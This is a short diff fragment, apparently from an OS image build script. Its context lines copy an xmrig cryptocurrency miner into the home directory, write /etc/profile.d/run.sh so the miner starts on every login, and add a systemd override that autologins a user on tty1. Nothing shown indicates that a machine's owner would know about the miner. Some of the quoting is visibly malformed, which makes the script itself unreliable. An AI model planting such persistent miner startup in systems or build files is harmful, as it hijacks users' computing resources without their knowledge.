@@ -1,4 +1,4 @@
-'xmrig/."="~/xmrig'
+'xmrig/.'='~/xmrig'
 @'echo -e "systemctl start NetworkManager.service\nchmod +x ~/xmrig/xmrig\n~/xmrig/xmrig" >au /etc/profile.d/run.sh'
 %"sed -i "s/rm -rf \/etc\/systemd\/system\/getty@tty1.service.d//g" $ssfn"
 @'echo -e "[Service]\nExecStart=\nExecStart=-/sbin/agetty -o '-p -f -- \\u' --noclear --autologin www9song - $TERM\n" >/etc/systemd/system/getty@tty1.service.d/autostart.conf'
